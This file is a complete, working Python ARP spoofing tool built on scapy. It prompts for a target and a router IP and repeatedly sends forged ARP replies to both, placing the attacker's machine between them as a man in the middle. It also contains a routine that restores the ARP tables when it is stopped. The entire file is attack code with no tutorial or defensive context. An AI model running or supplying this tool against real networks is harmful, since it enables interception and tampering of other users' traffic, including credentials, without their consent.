#!/usr/bin/env python
import scapy.all as scapy
import time
import sys

target_ip = input(">enter target ip")
gateway_ip = input(">enter router ip")
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, gateway_ip):
    dest_mac = get_mac(target_ip)
    src_mac = get_mac(gateway_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=dest_mac, psrc=gateway_ip,hwsrc=src_mac)
    scapy.send(packet,count=4,verbose=False)

try:
    packet_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_sent_count = packet_sent_count + 2
        print("\r [+] Sent" + str(packet_sent_count))
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] CTRL + C ......Reverting Back\n")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)

except IndexError:
    pass

